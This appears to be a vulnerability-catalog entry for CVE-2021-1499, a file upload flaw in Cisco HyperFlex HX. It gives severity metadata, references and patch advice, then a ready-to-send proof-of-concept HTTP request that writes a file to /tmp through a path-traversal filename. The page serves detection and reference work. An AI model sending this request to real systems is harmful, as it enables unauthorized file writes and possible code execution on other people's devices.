---
layout: post
cve_id: CVE-2021-1499
title: Cisco HyperFlex HX Data Platform - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2021/CVE-2021-1499.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-1499.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: medium
impact: 'Allows an attacker to upload and execute arbitrary files on the target system

  '
remediation: 'Apply the necessary security patches or updates provided by Cisco

  '
reference:
- https://swarm.ptsecurity.com/cisco-hyperflex-how-we-got-rce-through-login-form-and-other-findings/
- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-hyperflex-upload-KtCK8Ugz
- http://packetstormsecurity.com/files/163203/Cisco-HyperFlex-HX-Data-Platform-File-Upload-Remote-Code-Execution.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-1499
- https://github.com/Z0fhack/Goby_POC
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
  cvss-score: 5.3
  cve-id: CVE-2021-1499
  cwe-id: CWE-306
  epss-score: 0.9197
  epss-percentile: 0.99681
  cpe: cpe:2.3:h:cisco:hyperflex_hx220c_af_m5:-:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: cisco
  product: hyperflex_hx220c_af_m5
tags:
- cve2021
- cve
- fileupload
- intrusive
- packetstorm
- cisco
- vuln
---

## ðŸ” Vulnerability Description
Cisco HyperFlex HX Data Platform contains an arbitrary file upload vulnerability in the web-based management interface. An attacker can send a specific HTTP request to an affected device, thus enabling upload of files to the affected device with the permissions of the tomcat8 user.

## ðŸŒ HTTP Request
```nohighlight
POST /upload HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close
Content-Length: 274
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------253855577425106594691130420583
Origin: /
Referer: /
-----------------------------253855577425106594691130420583
Content-Disposition: form-data; name="file"; filename="../../../../../tmp/passwd9"
Content-Type: application/json
MyPasswdNewData->/api/tomcat
-----------------------------253855577425106594691130420583--
```

